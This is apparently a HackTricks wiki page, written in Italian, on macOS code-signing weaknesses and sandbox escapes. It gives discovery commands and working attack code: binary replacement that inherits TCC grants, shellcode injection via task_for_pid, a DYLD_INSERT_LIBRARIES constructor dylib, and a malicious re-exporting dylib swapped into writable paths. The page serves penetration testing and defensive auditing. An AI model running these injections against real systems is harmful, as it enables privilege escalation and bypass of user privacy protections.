# Debolezze del code signing di macOS & escape dalla sandbox

{{#include ../../../banners/hacktricks-training.md}}

## Binari firmati ad-hoc

### Informazioni di base

**Ad-hoc signing** (`CS_ADHOC`) crea una firma del codice senza **catena di certificati** — è un hash del codice senza nessuna verifica dell'identità dello sviluppatore. L'origine del binario non può essere ricondotta a nessun sviluppatore o organizzazione.

Nei Mac con Apple Silicon, tutti gli eseguibili richiedono almeno una firma ad-hoc. Questo significa che troverai firme ad-hoc in molti strumenti di sviluppo, pacchetti Homebrew e utility di terze parti.

### Perché è importante

- **Nessuna identità verificabile** — il binario può essere sostituito senza essere rilevato da controlli basati sull'identità
- I binari ad-hoc di terze parti in **posizioni privilegiate** (FDA, daemon, helpers) sono obiettivi ad alta priorità
- In alcune configurazioni, le firme ad-hoc potrebbero **non essere verificate con la stessa rigidità** delle firme degli sviluppatori
- I binari firmati ad-hoc che hanno **TCC grants** sono particolarmente preziosi — le autorizzazioni persistono anche se il contenuto del binario cambia (dipende da come TCC ha chiaveggiato/la chiave dell'autorizzazione) 

### Scoperta
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Attacco: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## Processi debuggabili (get-task-allow)

### Informazioni di base

L'entitlement **`com.apple.security.get-task-allow`** (o il flag `CS_GET_TASK_ALLOW`) permette a qualsiasi processo di collegarsi come debugger, leggere la memoria, modificare i registri, iniettare codice e controllare l'esecuzione.

Questo è previsto solo per le build di sviluppo. Tuttavia, alcuni binari di terze parti vengono distribuiti con questo entitlement in produzione.

> [!CAUTION]
> Un binario di produzione con `get-task-allow` è un **instant exploitation primitive**. Qualsiasi processo locale può chiamare `task_for_pid()`, ottenere il Mach task port del target e inject arbitrary code che viene eseguito con gli entitlements del target, i TCC grants e il contesto di sicurezza.

### Scoperta
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Attacco: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Nessuna validazione delle librerie + Ambiente DYLD

### La combinazione letale

Quando un binario ha **entrambi**:
- `com.apple.security.cs.disable-library-validation` (carica qualsiasi dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (accetta DYLD env vars)

Questa è una **guaranteed code injection primitive** — `DYLD_INSERT_LIBRARIES` funziona perfettamente.

### Scoperta
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Attacco: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Eccezioni temporanee della Sandbox

### Come indeboliscono la Sandbox

Sandbox temporary exceptions (`com.apple.security.temporary-exception.*`) creano delle falle nell'App Sandbox:

| Eccezione | Cosa permette |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Consentire la connessione ai servizi XPC/Mach di sistema |
| `temporary-exception.files.absolute-path.read-write` | Leggere/scrivere file al di fuori del container dell'app |
| `temporary-exception.iokit-user-client-class` | Aprire connessioni user-client IOKit |
| `temporary-exception.shared-preference.read-only` | Leggere le preferenze di altre app |
| `temporary-exception.files.home-relative-path.read-write` | Accedere a percorsi relativi a `~` |

### Mach-Lookup Exceptions = Sandbox Escape Primitive

The most dangerous exception is **mach-lookup** — it allows a sandboxed app to talk to privileged daemons:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Attacco: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Private Apple Entitlements

### Cosa sono

Gli entitlements con prefisso `com.apple.private.*` forniscono accesso alle **API interne Apple** non documentate o non disponibili per gli sviluppatori di terze parti. I binari di terze parti che presentano entitlements privati li hanno ottenuti tramite enterprise cert, MDM o distribuzione al di fuori dell'App Store.

### Dangerous Private Entitlements

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | Lettura/scrittura completa del database TCC |
| `com.apple.private.tcc.allow` | Accesso a specifici servizi TCC |
| `com.apple.private.security.no-sandbox` | Esecuzione senza sandbox |
| `com.apple.private.iokit` | Accesso diretto ai driver IOKit |
| `com.apple.private.kernel.\*` | Accesso all'interfaccia del kernel |
| `com.apple.private.xpc.launchd.job-label` | Registrare/gestire job di launchd |
| `com.apple.rootless.install` | Scrivere in percorsi protetti da SIP |

### Scoperta
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Profili Sandbox Personalizzati (SBPL)

### Cosa Sono

I binaries possono includere **profili sandbox personalizzati** scritti in SBPL (Seatbelt Profile Language). Questi profili possono essere più restrittivi OPPURE **più permissivi** rispetto all'App Sandbox predefinito.

### Audit dei Profili Personalizzati
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Percorsi di libreria scrivibili

### Cosa sono

Quando un binario carica una libreria dinamica da un percorso su cui l'utente corrente può **scrivere**, la libreria può essere sostituita con codice dannoso.

### Scoperta
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Attacco: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## Riferimenti

* [Apple Developer — Code Signing Guide](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
* [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
* [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
* [The Evil Bit — clear-library-validation](https://theevilbit.github.io/posts/com.apple.private.security.clear-library.validation/)

{{#include ../../../banners/hacktricks-training.md}}
